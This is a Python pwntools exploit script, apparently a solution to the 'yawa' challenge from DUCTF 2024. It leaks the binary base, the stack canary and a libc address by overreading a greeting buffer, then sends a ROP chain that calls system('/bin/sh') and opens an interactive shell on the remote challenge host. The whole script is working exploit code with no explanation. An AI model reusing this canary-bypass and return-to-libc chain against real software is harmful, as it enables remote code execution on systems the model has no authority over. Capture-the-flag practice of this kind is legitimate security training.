from pwn import *

gs = '''
break *main+108
continue
'''

elf = context.binary = ELF("./yawa")
libc = ELF("./libc.so.6")
def start():
    if args.REMOTE:
        return remote("2024.ductf.dev", 30010)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendlineafter("> ", b"2")

io.recvuntil("Hello, ")

leak_pie = u64(io.recv(6).strip().ljust(8, b"\x00"))

elf.address = leak_pie - 0x40

print(f"[+] Base Address: {hex(elf.address)}")

io.sendlineafter("> ", b"1")

io.send(b"A"*89)

io.sendlineafter("> ", b"2")

io.recvuntil(b"Hello, " + b"A"*89)

leak_canary = int(hex(u64(io.recv(7).strip().ljust(8, b"\x00"))) + "00", 16)

print(f"[+] Canary Address: {hex(leak_canary)}")

io.sendlineafter("> ", b"1")

io.send(b"A"*105)

io.sendlineafter("> ", b"2")

io.recvuntil(b"Hello, " + b"A"*105)

leak_libc = int(hex(u64(io.recv(5).strip().ljust(8, b"\x00"))) + "90", 16) + 48

print(f"[+] Leak Libc: {hex(leak_libc)}")

libc.address = leak_libc - libc.symbols.__libc_start_main_impl

rop = ROP(libc)
ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]

print(f"[+] pop rdi: {hex(pop_rdi_gadget)}")
print(f"[+] ret: {hex(ret_gadget)}")

payload = b"".join([
    b"A"*(88),
    p64(leak_canary),
    b"B"*8,
    p64(pop_rdi_gadget),
    p64(next(libc.search(b"/bin/sh"))),
    p64(ret_gadget),
    p64(libc.symbols.system)
])

io.sendlineafter("> ", b"1")

io.send(payload)

io.sendlineafter("> ", b"3") # Con esto vamos a stack smashed

io.interactive()